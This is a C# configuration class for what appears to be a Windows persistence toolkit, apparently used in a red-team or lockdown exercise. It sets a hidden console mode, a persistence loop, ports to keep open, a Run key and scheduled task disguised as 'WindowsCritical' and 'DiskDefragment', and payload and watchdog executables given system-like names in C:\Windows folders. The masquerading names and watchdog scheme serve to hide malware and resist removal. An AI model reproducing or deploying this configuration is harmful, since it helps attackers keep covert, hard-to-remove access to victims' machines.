
public class Config // This is for payload 2
{
    // Put the config at the top of this file that you want to run. the commented out one should be below for the powershell script
    public static bool Debugging { get; private set; } = false ; //Set to true for debugging messages and logs, to make the terminal show up, please change .csproj under both projects to compile to an "exe" instead of "winexe"
                                                                // Basically: Winexe = No Window Created , Exe = Windowed Console App

    public static int sleepTime { get; private set; } = 46000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                               // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence

    public static int[] PortsToKeepOpen { get; private set; } = new int[] {80, 443, 53, 5542, 5985, 5986, 5589, 445}; // Ports to keep open


    public static string RunKeyName { get; private set; } = "WindowsCritical";
    public static string ScheduledTaskName { get; private set; } = "DiskDefragment";


    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
    public static string PayloadName { get; private set; } = "SysLoad.exe";
    public static string PayloadFullPath { get; private set; } = Path.Combine(PayloadPath, PayloadName);




    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\SystemApps\"; // This will be created if it doesnt already exist
    public static string SecondaryWatchdogName { get; private set; } = "Windows Disk Management.exe";
    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDogBin2";
    public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);


    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\SysWOW64\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
    public static string PrimaryWatchdogName { get; private set; } = "WinCore.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDogBin2";
    public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
}





